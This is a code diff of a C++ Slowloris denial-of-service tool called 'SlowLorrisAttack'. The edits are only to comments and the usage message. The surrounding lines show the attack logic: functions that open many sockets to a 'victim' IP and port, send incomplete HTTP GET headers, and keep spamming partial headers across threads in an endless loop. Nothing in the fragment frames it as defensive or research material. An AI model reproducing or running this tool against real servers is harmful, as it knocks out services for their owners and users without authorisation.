@@ -26,7 +26,7 @@ int ARGS = 4;
 
 void initialSendSocket(int socketNum)
 {
-#pragma warning(disable:4996) //This is nasty, but it works.
+#pragma warning(disable:4996) //This is nasty, but it works. Sprintf errors as being unstable.
 	char incompleteHeader[255];
 	sprintf(incompleteHeader, "GET /%d HTTP/1.1\r\n", rand() % 99999);
 	send(socketNum, incompleteHeader, strlen(incompleteHeader), 0);
@@ -41,7 +41,7 @@ void initialSendSocket(int socketNum)
 
 void spamPartialHeaders(struct sockaddr_in victim, std::vector<int> socketList, int totalSockets)
 {
-	for (std::vector<int>::iterator it = socketList.begin(); it != socketList.end(); it++) //Replace standard for loop with vector iterator 
+	for (std::vector<int>::iterator it = socketList.begin(); it != socketList.end(); it++) //Replace standard for loop with vector iterator.
 	{
 		try
 		{
@@ -68,7 +68,7 @@ int main(int argc, char* argv[])
 		std::cerr << "Arg 2: " << " VICTIM PORT NUM" << std::endl;
 		std::cerr << "Arg 3: " << " NUM OF SOCKETS" << std::endl;
 		std::cerr << "Arg 4: " << " NUM OF THREADS" << std::endl;
-		std::cerr << "Usage: ./SlowLorrisAttack.cpp <dest_ip> <dest_port_num <num sockets> <num threads>" << std::endl;
+		std::cerr << "Usage: ./SlowLorrisAttack.cpp <dest_ip> <dest_port_num> <num_sockets> <num_threads>" << std::endl;
 		return 0;
 	}
 
@@ -141,7 +141,7 @@ int main(int argc, char* argv[])
 
 		std::cout << "Iteration " << iterations << " completed." << std::endl;
 		iterations++;
-		std::this_thread::sleep_for(std::chrono::milliseconds(15));  //replaces sleep(15) function as this one should work cross-platform.
+		std::this_thread::sleep_for(std::chrono::milliseconds(15));  //This should work cross-platform.
 		std::cout << "------------" << std::endl;
 	}
 }
